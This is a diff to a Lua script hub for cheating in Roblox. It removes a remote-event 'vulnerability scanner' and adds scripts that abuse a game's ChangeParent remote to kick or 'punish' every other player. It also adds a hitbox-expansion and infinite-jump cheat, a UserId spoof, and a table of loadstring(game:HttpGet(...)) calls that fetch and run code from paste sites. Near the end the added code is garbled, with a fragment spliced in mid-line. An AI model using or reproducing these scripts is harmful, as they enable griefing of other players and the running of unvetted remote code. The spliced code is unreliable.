@@ -1048,110 +1048,8 @@ CreateCMD("info",function()
 	print("--- END. ---")
 end)
 
-CreateScript("RemoteTestTool",function()
-	--[[
-	    Simple vulnerability scanner v1.1
-	    Made by 0fiiz#7952
-	]]--
-
-
-	local load_BackdoorEXE = false
-	local load_SimplySpy = false
-	local load_DestroyToolTest = true
-
-	if load_SimplySpy == true then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
-	end
-
-	if load_BackdoorEXE == true then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
-	end
-
-	local PingWords = {
-		"destroy",
-		"delete",
-		"del",
-		"place",
-		"remove",
-		"replicate",
-		"loadstring",
-		"rev",
-		"admin",
-		"create",
-		"property",
-		"spawn",
-		"clear",
-		"trash",
-		"fire",
-		"bomb",
-		"explode",
-		"color",
-		"update",
-		"car",
-		"money",
-		"cheat",
-		"data",
-		"save",
-		"build",
-		"backdoor",
-		"invis",
-		"hide",
-		"set"
-	}
-
-	local PossibleRemotes = {}
-
-	for i,v in pairs(game:GetDescendants()) do
-		if v:IsA("RemoteEvent") then
-			for x,z in pairs(PingWords) do
-				if string.find(v.Name:lower(), z:lower()) then
-					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
-					table.insert(PossibleRemotes, v)
-				end
-			end
-		end
-	end
-	
-	if load_DestroyToolTest == true then
-		removething("RTT Tool",game:GetService("Players").LocalPlayer.Backpack)
-		
-		local RemoteTestTool = Instance.new("Tool",game:GetService("Players").LocalPlayer.Backpack)
-		RemoteTestTool.Name = "RTT Tool"
-		RemoteTestTool.RequiresHandle = false
-		RemoteTestTool.Activated:Connect(function()
-			for i,v in pairs(PossibleRemotes) do
-				v:FireServer(game:GetService("Players").LocalPlayer:GetMouse().Target)
-			end
-		end)
-	end
-end)
-
-CreateCMD("kick",function()
-game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value])
-end)
-
-CreateCMD("punish",function()
-game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character)
-end)
-
-Follow = false
-
-CreateCMD("annoy",function()
-	local p = game:GetService("Players")[Player.Value]
-	if p.Character and p.Character:FindFirstChild("Humanoid") then
-		if Follow == true then
-			Follow = false; return
-		else Follow = true end
-		while Follow == true do
-			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
-			wait()
-		end
-	end
-end)
-
-CreateCMD("unannoy",function()
-Follow = false
-end)
+CreateScript("Titan",function()
+	loadstring(game:HttpGet("https://pastefy.app/ORe0fQ07/raw"))()
 
 CreateScript("Robot",function()
 	loadstring(game:HttpGet("https://pastefy.app/ur8n4dc6/raw",true))()("Copyright ERROR_CODE ECCS Co")
@@ -1225,6 +1123,51 @@ CreateScript("Delete Roleplay Tool",function()
 	tool.Name = "Delete tool"
 	tool.Activated:Connect(function()
 	game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(mouse.Target)
+	end)
+	tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+
+CreateScript("Kick Others Roleplay",function()
+	for i,v in pairs(game:GetService("Players"):GetChildren()) do
+		if v:IsA("Player") then
+			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
+				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v,nil)
+			end
+		end
+	end
+end)
+
+CreateScript("Punish Others Roleplay",function()
+	for i,v in pairs(game:GetService("Players"):GetChildren()) do
+		if v:IsA("Player") then
+			if v.Name ~= game:GetService("Players").LocalPlayer.Name then
+				game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(v.Character,nil)
+			end
+		end
+	end
+end)
+
+CreateScript("HitBox & Infjump",function()
+local InfiniteJumpEnabled = true game:GetService("UserInputService").JumpRequest:connect(function() if InfiniteJumpEnabled then game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping") end end)
+game.Players.LocalPlayer.UserId = "2205774994"
+_G.HeadSize = 20 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.HumanoidRootPart.Transparency = 0.7 v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue") v.Character.HumanoidRootPart.Material = "Neon" v.Character.HumanoidRootPart.CanCollide = false end) end end end end)
+end)
+
+--// AutomaticBlox
+local scripts = {
+	["Google Script Hub"] = game:HttpGet("https://pastebin.com/raw/JcNAaJvZ"),
+	["Swim Hub"] = game:HttpGet("https://raw.githubusercontent.com/SwimPaste/swimhack/main/swimloader_ui.lua"),
+	["VHub"] = game:HttpGet("https://raw.githubusercontent.com/Veincx5315/Created/VHub/Simple"),
+	["Fanmade Synapse Hub"] = game:HttpGet("https://paste.website/p/49cb753f-6618-4e2a-a23d-be5723a5b7b3.txt"),
+	["ClickTweens"] = game:HttpGet("https://paste.website/p/72bec212-54ea-4050-9d71-a0476981e69f.txt"),
+	["Erased Admin"] = game:HttpGet("https://paste.website/p/7d6deca7-b380-4bc0-98cb-46695e073fba.txt"),
+}
+
+for i,v in pairs(scripts) do
+	CreateScript(i,function()
+	loadstring(v)() -- not made by kosovo this time
+	end)
+endts.Tools.ChangeParent:FireServer(mouse.Target)
 	end)
 	tool.Parent = game.Players.LocalPlayer.Backpack
 end)
